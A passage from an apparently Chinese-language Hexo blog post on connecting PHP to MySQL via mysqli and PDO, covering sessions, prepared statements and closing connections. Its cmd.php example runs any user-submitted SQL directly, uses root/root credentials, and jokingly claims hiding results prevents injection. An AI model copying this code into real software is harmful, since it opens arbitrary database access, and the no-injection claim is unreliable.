html>\n<html lang=\"en\">\n<head>\n        <meta charset=\"UTF-8\">\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n        <title>连接数据库</title>\n</head>\n<body>\n        <p>\n        请输入服务器，用户名以及密码\n        </p>\n        <form action=\"index.php\" method=\"post\">\n        服务器：<input type=\"text\" name=\"servername\">\n        用户名：<input type=\"text\" name=\"username\">\n        密码：<input type=\"password\" name=\"passwd\">\n        <input type=\"submit\" value=\"提交\">\n        </form>\n        <p id=\"success\">\n        </p>\n</body>\n</html>\n<?php\n}\n?><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<pre class=\"line-numbers language-php+HTML\"><code class=\"language-php+HTML\">//cmd.php\n<?php\n\nsession_start();\n$servername=$_SESSION['servername'];\n$username=$_SESSION['username'];\n$password=$_SESSION['passwd'];\n// $dbname=$_GET['dbname'];\n\n$sql = new mysqli($servername,$username,$password);\nif($sql->connect_error){\n        die(\"连接失败\".$sql->connect_error);\n}\nif(!empty($_POST['cmd'])){\n        $cmd=$_POST['cmd'];\n        if($sql->query(\"$cmd\")===TRUE)\n        {\n                echo \"命令执行成功，但我就不给你看结果,嘻嘻\";\n        }\n        else{\n                echo \"执行失败\".\"Error:\".$sql->error;\n        }\n}\nelse{\n?>\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"UTF-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n<title>输入SQL命令</title>\n</head>\n<body>\n<p>\n输入SQL命令：\n</p>\n<form action=\"cmd.php\" method=\"post\">\n        <input type=\"text\" name=\"cmd\" value=\"USE mysql\">\n        <input type=\"submit\" value=\"提交\">\n</form>\n</body>\n</html>\n<?php\n}\n?><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>上面代码开启了session，配置cookie保存session ID（手动设置了session生存周期为1天），用session保存了’servername’，’username’，’password’（一般来说最好不要保存这么多重要信息），并在index.php转到cmd.php时用session保证信息传递</p>\n<p>运行结果</p>\n<p><img src=\"E:%5C%E6%96%87%E6%A1%A3%5CGithub%E4%BB%93%E5%BA%93%5CLiGuHeiYi%5CLiGuHeiYi.github.io%5Cimg%5Csession%E8%BF%9E%E6%8E%A5.png\" alt=\"\"></p>\n<p><img src=\"E:%5C%E6%96%87%E6%A1%A3%5CGithub%E4%BB%93%E5%BA%93%5CLiGuHeiYi%5CLiGuHeiYi.github.io%5Cimg%5Csession%E8%BF%9E%E6%8E%A5%E5%BC%B9%E7%AA%97.png\" alt=\"\"></p>\n<p><img src=\"E:%5C%E6%96%87%E6%A1%A3%5CGithub%E4%BB%93%E5%BA%93%5CLiGuHeiYi%5CLiGuHeiYi.github.io%5Cimg%5Csession%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F.png\" alt=\"\"></p>\n<p><strong>没有报错，所以利用session传递用户信息和连接数据库成功了。</strong></p>\n<h2 id=\"用PDO连接mysql数据库\"><a href=\"#用PDO连接mysql数据库\" class=\"headerlink\" title=\"用PDO连接mysql数据库\"></a>用PDO连接mysql数据库</h2><p>在Windows用pdo之前需要在php.ini里，将pdo拓展打开，具体方法是将# extension = php_pdo.dll这一行注释去掉(phpstudy已经做完了这一步)，然后需要连接哪种数据库就再去掉哪种数据库的注释。PDO(php database object)最大的优点就是可以连接不止mysql这一种数据库，比较方便的地方是可以使用异常类来处理程序运行时出现的问题，像下面代码可以将执行部分放在try{}模块中，发生异常直接获得信息，不用像上面sqli一样每次都判断一下执行是否成功</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n<span class=\"token variable\">$servername</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"localhost\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"root\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"root\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$conn</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">PDO</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mysql:host=$servername;\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\" spellcheck=\"true\">//建立连接对象</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string\">\"连接成功\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span>PDOException <span class=\"token variable\">$e</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$e</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">getMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token delimiter\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>还是放到phpstudy的本地网站里，打开网站</p>\n<p>![](\\img\\pdo connect.png)</p>\n<h2 id=\"预处理语句及绑定参数\"><a href=\"#预处理语句及绑定参数\" class=\"headerlink\" title=\"预处理语句及绑定参数\"></a>预处理语句及绑定参数</h2><p>预处理语句用于执行多个相同的 SQL 语句，并且执行效率更高。</p>\n<p>预处理语句的工作原理如下：</p>\n<ol>\n<li><p>预处理：<strong>创建 SQL 语句模板</strong>并发送到数据库。预留的值使用参数 “<strong>?</strong>“ 标记 。例如：</p>\n<pre><code>INSERT INTO MyGuests (firstname, lastname, email) VALUES(?, ?, ?)</code></pre></li>\n<li><p>数据库解析，编译，对SQL语句模板执行查询优化，并存储结果不输出。</p>\n</li>\n<li><p>执行：最后，将应用绑定的值传递给参数（”?” 标记），数据库执行语句。应用可以多次执行语句，如果参数的值不一样。</p>\n</li>\n</ol>\n<p>相比于直接执行SQL语句，预处理语句有两个主要优点：</p>\n<ul>\n<li><p>预处理语句大大减少了分析时间，只做了一次查询（虽然语句多次执行）。</p>\n</li>\n<li><p>绑定参数减少了服务器带宽，你只需要发送查询的参数，而不是整个语句。</p>\n</li>\n<li><p>预处理语句针对SQL注入是非常有用的，因为参数值发送后使用不同的协议，保证了数据的合法性。</p>\n<h3 id=\"PDO-中的预处理语句\"><a href=\"#PDO-中的预处理语句\" class=\"headerlink\" title=\"PDO 中的预处理语句\"></a>PDO 中的预处理语句</h3><h4 id=\"实例-PDO-使用预处理语句\"><a href=\"#实例-PDO-使用预处理语句\" class=\"headerlink\" title=\"实例 (PDO 使用预处理语句)\"></a>实例 (PDO 使用预处理语句)</h4><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n<span class=\"token variable\">$servername</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"localhost\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"root\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"root\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$dbname</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"myDBPDO\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$conn</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">PDO</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mysql:host=$servername;dbname=$dbname\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\" spellcheck=\"true\">// 设置 PDO 错误模式为异常</span>\n    <span class=\"token variable\">$conn</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">setAttribute</span><span class=\"token punctuation\">(</span><span class=\"token constant\">PDO</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token constant\">ATTR_ERRMODE</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">PDO</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token constant\">ERRMODE_EXCEPTION</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\" spellcheck=\"true\">// 预处理 SQL 并绑定参数</span>\n    <span class=\"token variable\">$stmt</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$conn</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span>\"<span class=\"token constant\">INSERT</span> <span class=\"token constant\">INTO</span> <span class=\"token function\">MyGuests</span> <span class=\"token punctuation\">(</span>firstname<span class=\"token punctuation\">,</span> lastname<span class=\"token punctuation\">,</span> email<span class=\"token punctuation\">)</span> \n    <span class=\"token function\">VALUES</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">:</span>firstname<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">:</span>lastname<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">:</span>email<span class=\"token punctuation\">)</span>\"<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$stmt</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">bindParam</span><span class=\"token punctuation\">(</span><span class=\"token string\">':firstname'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$firstname</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$stmt</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">bindParam</span><span class=\"token punctuation\">(</span><span class=\"token string\">':lastname'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$lastname</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$stmt</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">bindParam</span><span class=\"token punctuation\">(</span><span class=\"token string\">':email'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$email</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\" spellcheck=\"true\">// 插入多行数据</span>\n    <span class=\"token variable\">$firstname</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"John\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$lastname</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"Doe\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$email</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"john@example.com\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$stmt</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token variable\">$firstname</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"Mary\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$lastname</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"Moe\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$email</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"mary@example.com\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$stmt</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token variable\">$firstname</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"Julie\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$lastname</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"Dooley\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$email</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"julie@example.com\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$stmt</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">echo</span> <span class=\"token string\">\"新记录插入成功\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span>PDOException <span class=\"token variable\">$e</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string\">\"Error: \"</span> <span class=\"token punctuation\">.</span> <span class=\"token variable\">$e</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">getMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token variable\">$conn</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter\">?></span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n</ul>\n<h2 id=\"关闭连接\"><a href=\"#关闭连接\" class=\"headerlink\" title=\"关闭连接\"></a>关闭连接</h2><p>连接在脚本执行完后会自动关闭。但也可以使用以下代码来关闭连接：</p>\n<h4 id=\"实例-MySQLi-面向对象\"><a href=\"#实例-MySQLi-面向对象\" class=\"headerlink\" title=\"实例 (MySQLi - 面向对象)\"></a>实例 (MySQLi - 面向对象)</h4><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token variable\">$conn</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h4 id=\"实例-MySQLi-面向过程\"><a href=\"#实例-MySQLi-面向过程\" class=\"headerlink\" title=\"实例 (MySQLi - 面向过程)\"></a>实例 (MySQLi - 面向过程)</h4><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token function\">mysqli_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h4 id=\"实例-PDO\"><a href=\"#实例-PDO\" class=\"headerlink\" title=\"实例 (PDO)\"></a>实例 (PDO)</h4><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token variable\">$conn</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<h1 id=\"php连接MySQL\"><a href=\"#php连接MySQL\" class=\"headerlink\" title=\"php连接MySQL\"></a>php连接MySQL</h1><h2 id=\"用mysqli以面向对象的方式连接mysql数据库\"><a href=\"#用mysqli以面向对象的方式连接mysql数据库\" class=\"headerlink\" title=\"用mysqli以面向对象的方式连接mysql数据库\"></a>用mysqli以面向对象的方式连接mysql数据库</h2><p>在本地网站建一个这样的index.php,就能连接到本地MySQL服务器了，以下代码纯手撸~ 可以自行输入服务器名，用户，密码</p>\n<pre><code class=\"php+HTML\">&lt;?php\nif($_POST[&#39;servername&#39;]&amp;&amp;$_POST[&#39;username&#39;]&amp;&amp;$_POST[&#39;passwd&#39;])\n{\n        $servername=$_POST[&#39;servername&#39;];\n        $username=$_POST[&#39;username&#39;];\n        $password=$_POST[&#39;passwd&#39;];\n// $dbname=$_GET[&#39;dbname&#39;];\n\n        $sql = new mysqli($servername,$username,$password);\n        if($sql-&gt;connect_error)\n        {\n                die(&quot;连接失败：&quot;.$sql-&gt;connect_error);\n        }\n        else\n        {\n                echo &quot;&lt;script&gt;alert(\\&quot;连接成功\\&quot;)&lt;/script&gt;&quot;;\n                // header(&#39;Location:cmd.php&#39;);\n                // exit;\n                $url = &quot;cmd.php&quot;;\n                echo &quot;&lt;script language=&#39;javascript&#39; type=&#39;text/javascript&#39;&gt;&quot;;\n                echo &quot;window.location.href=&#39;$url&#39;&quot;;\n                echo &quot;&lt;/script&gt;&quot;;\n        }\n}\nelse\n{\n?&gt;\n&lt;!DOCTYPE html&gt;\n&lt;html lang=&quot;en&quot;&gt;\n&lt;head&gt;\n        &lt;meta charset=&quot;UTF-8&quot;&gt;\n        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;\n        &lt;title&gt;连接数据库&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n        &lt;p&gt;\n        请输入服务器，用户名以及密码\n        &lt;/p&gt;\n        &lt;form action=&quot;index.php&quot; method=&quot;post&quot;&gt;\n        服务器：&lt;input type=&quot;text&quot; name=&quot;servername&quot;&gt;\n        用户名：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;\n        密码：&lt;input type=&quot;password&quot; name=&quot;passwd&quot;&gt;\n        &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;\n        &lt;/form&gt;\n        &lt;p id=&quot;success&quot;&gt;\n        &lt;/p&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n&lt;?php\n}\n?&gt;</code></pre>\n<p>访问页面</p>\n<p><img src=\"%5Cimg%5C%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93.png\" alt></p>\n<p>这里输入啥就可以登陆啥了，我这里以root用户登录localhost</p>\n<p>连接成功！</p>\n<p><img src=\"%5Cimg%5C%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F.png\" alt></p>\n<p>我这里设计了一个可以提交mysql命令的页面（注入漏洞警告！）</p>\n<p><img src=\"%5Cimg%5C%E6%8F%90%E4%BA%A4%E5%91%BD%E4%BB%A4.png\" alt></p>\n<p>提交以后，嘻嘻，这样就没法注入了吧</p>\n<p><img src=\"%5Cimg%5C%E6%88%90%E5%8A%9F%E4%BA%86%E4%B9%9F%E4%B8%8D%E7%BB%99%E4%BD%A0%E7%9C%8B.png\" alt></p>\n<p>cmd.php的源码</p>\n<pre><code class=\"php+HTML\">&lt;?php\n\n$servername=&#39;localhost&#39;;\n$username=&#39;root&#39;;\n$password=&#39;root&#39;;\n// $dbname=$_GET[&#39;dbname&#39;];\n\n$sql = new mysqli($servername,$username,$password);\nif($_GET[&#39;cmd&#39;])\n{\n        $cmd=$_GET[&#39;cmd&#39;];\n        if($sql-&gt;query($cmd))\n        {\n                echo &quot;命令执行成功，但我就不给你看结果,嘻嘻&quot;;\n        }\n        else{\n                echo &quot;执行失败&quot;.&quot;Error:&quot;.$sql-&gt;error;\n        }\n}\nelse{\n?&gt;\n&lt;!DOCTYPE html&gt;\n&lt;html lang=&quot;en&quot;&gt;\n&lt;head&gt;\n&lt;meta charset=&quot;UTF-8&quot;&gt;\n&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;\n&lt;title&gt;输入SQL命令&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;p&gt;\n输入SQL命令：\n&lt;/p&gt;\n&lt;form action=&quot;cmd.php&quot; mothod=&quot;get&quot;&gt;\n&lt;input type=&quot;text&quot; name=&quot;cmd&quot; value=&quot;USE mysql&quot;&gt;\n&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;\n&lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n&lt;?php\n}\n?&gt;</code></pre>\n<p>实际上，应该用session来继承从index页面获得的数据，这里我偷个懒，用session的实现留到以后再说</p>\n<p>。。。</p>\n<p>好的，三天过去了。我来接着水用cookie或session来实现的方法了</p>\n<p>只要将上面的代码改造一点点，改成下面这样</p>\n<pre><code class=\"php+HTML\">//index.php\n&lt;?php\nif($_POST[&#39;servername&#39;]&amp;&amp;$_POST[&#39;username&#39;]&amp;&amp;$_POST[&#39;passwd&#39;])\n{\n        $servername=$_POST[&#39;servername&#39;];\n        $username=$_POST[&#39;username&#39;];\n        $password=$_POST[&#39;passwd&#39;];\n// $dbname=$_GET[&#39;dbname&#39;];\n\n        $sql = new mysqli($servername,$username,$password);\n        if($sql-&gt;connect_error)\n        {\n                die(&quot;连接失败：&quot;.$sql-&gt;connect_error);\n        }\n        else\n        {\n                session_start();\n                //开启session\n                $lifetime=3600 * 24;    //设置cookie生存周期为1天\n                setcookie(session_name(),session_id(),time() + $lifetime,&quot;/&quot;);\n                //如果没有这行代码，服务器也会生成一个临时session\n                $_SESSION[&#39;servername&#39;]=$servername;\n                $_SESSION[&#39;username&#39;]=$username;\n                $_SESSION[&#39;passwd&#39;]=$password;\n                echo &quot;&lt;script&gt;alert(\\&quot;连接成功\\&quot;)&lt;/script&gt;&quot;;\n                // header(&#39;Location:cmd.php&#39;);\n                // exit;\n                $url = &quot;cmd.php&quot;;\n                echo &quot;&lt;script language=&#39;javascript&#39; type=&#39;text/javascript&#39;&gt;&quot;;\n                echo &quot;window.location.href=&#39;$url&#39;&quot;;\n                echo &quot;&lt;/script&gt;&quot;;\n        }\n}\nelse\n{\n?&gt;\n&lt;!DOCTYPE html&gt;\n&lt;html lang=&quot;en&quot;&gt;\n&lt;head&gt;\n        &lt;meta charset=&quot;UTF-8&quot;&gt;\n        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;\n        &lt;title&gt;连接数据库&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n        &lt;p&gt;\n        请输入服务器，用户名以及密码\n        &lt;/p&gt;\n        &lt;form action=&quot;index.php&quot; method=&quot;post&quot;&gt;\n        服务器：&lt;input type=&quot;text&quot; name=&quot;servername&quot;&gt;\n        用户名：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;\n        密码：&lt;input type=&quot;password&quot; name=&quot;passwd&quot;&gt;\n        &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;\n        &lt;/form&gt;\n        &lt;p id=&quot;success&quot;&gt;\n        &lt;/p&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n&lt;?php\n}\n?&gt;</code></pre>\n<pre><code class=\"php+HTML\">//cmd.php\n&lt;?php\n\nsession_start();\n$servername=$_SESSION[&#39;servername&#39;];\n$username=$_SESSION[&#39;username&#39;];\n$password=$_SESSION[&#39;passwd&#39;];\n// $dbname=$_GET[&#39;dbname&#39;];\n\n$sql = new mysqli($servername,$username,$password);\nif($sql-&gt;connect_error){\n        die(&quot;连接失败&quot;.$sql-&gt;connect_error);\n}\nif(!empty($_POST[&#39;cmd&#39;])){\n        $cmd=$_POST[&#39;cmd&#39;];\n        if($sql-&gt;query(&quot;$cmd&quot;)===TRUE)\n        {\n                echo &quot;命令执行成功，但我就不给你看结果,嘻嘻&quot;;\n        }\n        else{\n                echo &quot;执行失败&quot;.&quot;Error:&quot;.$sql-&gt;error;\n        }\n}\nelse{\n?&gt;\n&lt;!DOCTYPE html&gt;\n&lt;html lang=&quot;en&quot;&gt;\n&lt;head&gt;\n&lt;meta charset=&quot;UTF-8&quot;&gt;\n&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;\n&lt;title&gt;输入SQL命令&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;p&gt;\n输入SQL命令：\n&lt;/p&gt;\n&lt;form action=&quot;cmd.php&quot; method=&quot;post&quot;&gt;\n        &lt;input type=&quot;text&quot; name=&quot;cmd&quot; value=&quot;USE mysql&quot;&gt;\n        &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;\n&lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n&lt;?php\n}\n?&gt;</code></pre>\n<p>上面代码开启了session，配置cookie保存session ID（手动设置了session生存周期为1天），用session保存了’servername’，’username’，’password’（一般来说最好不要保存这么多重要信息），并在index.php转到cmd.php时用session保证信息传递</p>\n<p>运行结果</p>\n<p><img src=\"E:%5C%E6%96%87%E6%A1%A3%5CGithub%E4%BB%93%E5%BA%93%5CLiGuHeiYi%5CLiGuHeiYi.github.io%5Cimg%5Csession%E8%BF%9E%E6%8E%A5.png\" alt></p>\n<p><img 